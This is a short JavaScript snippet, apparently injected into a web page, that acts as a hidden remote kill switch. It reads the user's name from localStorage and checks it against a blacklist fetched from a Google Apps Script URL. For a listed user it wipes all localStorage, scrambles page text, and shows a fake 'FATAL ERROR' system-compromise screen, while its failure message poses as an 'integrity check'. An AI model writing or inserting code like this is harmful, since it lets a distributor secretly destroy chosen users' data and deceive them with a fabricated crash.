(async function() {
    // --- PASTE YOUR NEW WEB APP URL HERE ---
    const BLACKLIST_API_URL = 'https://script.google.com/macros/s/AKfycbw-Lgyv0Mme48vf0eB2lzO97_qxSXyZ-J0r3T82KtCiIPRmCX4-8IUtWaNSbSOKEzNY-Q/exec'; 
    // ---------------------------------------

    function triggerGlitchMode() {
        console.error("mb bro ts dont work anymore");
        
        // 1. Inject Chaos CSS
        const style = document.createElement('style');
        style.innerHTML = `
            body {
                background-color: #000 !important;
                color: #00ff00 !important;
                font-family: 'Courier New', monospace !important;
                overflow: hidden !important;
                cursor: not-allowed !important;
                user-select: none !important;
            }
            @keyframes glitch-anim {
                0% { clip-path: inset(40% 0 61% 0); transform: translate(-2px, 2px); }
                20% { clip-path: inset(92% 0 1% 0); transform: translate(0px, 0px); }
                40% { clip-path: inset(43% 0 1% 0); transform: translate(2px, -2px); }
                60% { clip-path: inset(25% 0 58% 0); transform: translate(2px, 2px); }
                80% { clip-path: inset(54% 0 7% 0); transform: translate(-1px, -2px); }
                100% { clip-path: inset(58% 0 43% 0); transform: translate(0px, 0px); }
            }
            body > * {
                animation: glitch-anim 0.3s infinite linear alternate-reverse;
                opacity: 0.8;
                filter: contrast(200%) noise(100%);
                pointer-events: none;
            }
            img, canvas, svg, .data-widget, header, footer { display: none !important; }
        `;
        document.head.appendChild(style);

        // 2. Corrupt Text
        const allElements = document.querySelectorAll('h1, h2, h3, p, span, div, a, button');
        allElements.forEach(el => {
            if(Math.random() > 0.5) {
                el.innerText = el.innerText.split('').map(c => Math.random() > 0.5 ? String.fromCharCode(33 + Math.random() * 93) : c).join('');
            }
        });

        // 3. Final crash screen
        setTimeout(() => {
            document.body.innerHTML = `
                <div style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;background:black;color:red;text-align:center;">
                    <h1 style="font-size:5em;">FATAL ERROR</h1>
                    <p>0xC000021A - SYSTEM_INTEGRITY_COMPROMISED</p>
                    <p>User ID rejected by host controller.</p>
                </div>
            `;
        }, 2000);
    }

    try {
        // 1. Get User Name
        const mbsDataString = localStorage.getItem('mbsData');
        if (!mbsDataString) return;

        const mbsData = JSON.parse(mbsDataString);
        if (!mbsData.nom) return;

        const userName = mbsData.nom.trim().toLowerCase();

        // 2. Fetch Blacklist
        // Note: We assume GET requests to this public script handle CORS automatically via Google's redirects
        const response = await fetch(BLACKLIST_API_URL);
        
        if (!response.ok) return;

        const blacklist = await response.json();

        // 3. Check Match
        // We check if the blacklist array includes the user's name
        if (blacklist.includes(userName)) {
            localStorage.clear(); // Wipe data
            triggerGlitchMode();
        }

    } catch (e) {
        // Silent fail
        console.warn("Integrity check skipped."); 
    }
})();
